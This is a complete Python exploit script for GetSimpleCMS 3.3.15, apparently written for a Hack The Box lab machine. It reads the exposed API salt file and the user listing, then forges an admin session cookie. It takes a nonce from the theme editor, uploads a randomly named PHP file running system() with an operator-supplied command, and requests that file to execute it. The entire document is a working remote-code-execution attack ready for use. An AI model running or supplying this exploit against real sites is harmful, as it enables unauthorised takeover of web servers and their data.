import requests
from bs4 import BeautifulSoup
import hashlib
import random
import string

class GetSimpleCMSExploit:
    def __init__(self, target_url, command):
        self.target_url = target_url.rstrip('/')
        self.command = command
        self.session = requests.Session()
        self.version = None
        self.salt = None
        self.username = None
        self.cookie = None
        self.nonce = None

    def check_vulnerability(self):
        version = self.gscms_version()
        if not version:
            print("[-] Target is not vulnerable.")
            return False
        print(f"[+] GetSimpleCMS version {version} detected.")
        if not self.vulnerable():
            print("[-] Target is not vulnerable.")
            return False
        return True

    def gscms_version(self):
        response = self.session.get(f"{self.target_url}/admin/")
        if response.status_code != 200:
            return None

        soup = BeautifulSoup(response.text, 'html.parser')
        generator = soup.find('script', {'type': 'text/javascript'})
        if not generator or not generator['src']:
            return None

        vers = generator['src'].split('?v=').pop().replace(".", "")
        if len(vers) == 3:
            vers = f"{vers[0]}.{vers[1]}.{vers[2]}"
        self.version = vers
        return vers

    def get_salt(self):
        uri = f"{self.target_url}/data/other/authorization.xml"
        response = self.session.get(uri)
        if response.status_code != 200:
            return False

        soup = BeautifulSoup(response.content, 'xml')
        apikey = soup.find('apikey')
        if not apikey:
            return False
        self.salt = apikey.text
        return True

    def get_user(self):
        uri = f"{self.target_url}/data/users/"
        response = self.session.get(uri)
        if response.status_code != 200:
            return False

        soup = BeautifulSoup(response.text, 'html.parser')
        user_xml = soup.find(string=lambda text: 'xml' in text if text else False)
        if not user_xml:
            return False
        self.username = user_xml.split('.xml')[0]
        return True

    def gen_cookie(self):
        cookie_name = f"getsimple_cookie_{self.version}"
        sha_salt_usr = hashlib.sha1(f"{self.username}{self.salt}".encode()).hexdigest()
        sha_salt_cookie = hashlib.sha1(f"{cookie_name}{self.salt}".encode()).hexdigest()
        self.cookie = f"GS_ADMIN_USERNAME={self.username};{sha_salt_cookie}={sha_salt_usr}"

    def get_nonce(self):
        headers = {'Cookie': self.cookie}
        response = self.session.get(f"{self.target_url}/admin/theme-edit.php?t=Innovation&f=Default Template&s=Edit", headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find('input', {'id': 'nonce'})
        if not nonce_input or not nonce_input['value']:
            return False
        self.nonce = nonce_input['value']
        return True

    def upload_file(self, filename, content):
        headers = {'Cookie': self.cookie}
        payload = {
            'submitsave': 2,
            'edited_file': filename,
            'content': content,
            'nonce': self.nonce
        }
        response = self.session.post(f"{self.target_url}/admin/theme-edit.php", data=payload, headers=headers)
        return 'has successfully been updated!' in response.text

    def vulnerable(self):
        uri = f"{self.target_url}/data/other/authorization.xml"
        response = self.session.get(uri)
        if response.status_code != 200:
            return False

        uri = f"{self.target_url}/data/users/"
        response = self.session.get(uri)
        if response.status_code != 200:
            return False
        return True

    def exploit(self):
        if not self.check_vulnerability():
            print("[-] Exploitation aborted.")
            return

        if not self.get_salt():
            print("[-] Failed to retrieve salt.")
            return

        if not self.get_user():
            print("[-] Failed to retrieve username.")
            return

        self.gen_cookie()

        if not self.get_nonce():
            print("[-] Failed to retrieve nonce.")
            return

        filename = ''.join(random.choices(string.ascii_letters, k=random.randint(6, 16))) + '.php'
        php_payload = f"<?php system('{self.command}'); ?>"
        if self.upload_file(filename, php_payload):
            print("[+] Theme edit successful!")
            try:
                response = self.session.get(f"{self.target_url}/theme/{filename}")
                print(response.text)
                print("[*] Press Ctrl+C to exit.")
                while True:
                    pass  # Keep the script running until interrupted by the user
            except KeyboardInterrupt:
                print("\n[+] User aborted the script.")
        else:
            print("[-] Theme edit not successful!")

def print_banner():
    colors = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m']
    color = random.choice(colors)
    banner = f"""
 {color}_______  _______ _________   _______ _________ _______  _______  _        _______    _______  _______  _______             _______  _______  _______ 
(  ____ \(  ____ \\__   __/  (  ____ \\__   __/(       )(  ____ )( \      (  ____ \  (  ____ \(       )(  ____ \           (  ____ )(  ____ \(  ____ \\
| (    \/| (    \/   ) (     | (    \/   ) (   | () () || (    )|| (      | (    \/  | (    \/| () () || (    \/           | (    )|| (    \/| (    \/
| |      | (__       | |     | (_____    | |   | || || || (____)|| |      | (__      | |      | || || || (_____    _____   | (____)|| |      | (__    
| | ____ |  __)      | |     (_____  )   | |   | |(_)| ||  _____)| |      |  __)     | |      | |(_)| |(_____  )  (_____)  |     __)| |      |  __)   
| | \_  )| (         | |           ) |   | |   | |   | || (      | |      | (        | |      | |   | |      ) |           | (\ (   | |      | (      
| (___) || (____/\   | |     /\____) |___) (___| )   ( || )      | (____/\| (____/\  | (____/\| )   ( |/\____) |           | ) \ \__| (____/\| (____/\\
(_______)(_______/   )_(     \_______)\_______/|/     \||/       (_______/(_______/  (_______/|/     \|\_______)           |/   \__/(_______/(_______/                                                                                                                                               
    
Created By: H088yHaX0R / (HTB - AKA: Marz0)

Works for GetSimpleCMS 3.3.15
\033[0m"""
    print(banner)

# Example usage
if __name__ == "__main__":
    try:
        print_banner()
        target_url = input("Enter the target URL (e.g., http://gettingstarted.htb): ")
        command = input("Enter the command to execute: ")
        exploit = GetSimpleCMSExploit(target_url, command)
        exploit.exploit()
    except KeyboardInterrupt:
        print("\n[+] User aborted the script.")
